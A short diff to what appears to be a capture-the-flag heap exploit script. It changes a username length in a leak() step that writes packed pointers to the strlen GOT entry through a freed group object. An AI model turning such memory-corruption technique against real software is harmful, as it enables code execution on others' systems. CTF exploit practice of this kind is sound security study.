@@ -44,7 +44,7 @@ def overflow():
     sleep(2)    # group_name and group freed by GC
 
 def leak():
-    add_user('b'*32, 'B'*4)   # group
+    add_user('b'*8, 'B'*4)  # group
     strlen_got = elf.got['strlen']
     edit_group(0, "y", p64(0)+p64(strlen_got)+p64(strlen_got))
 
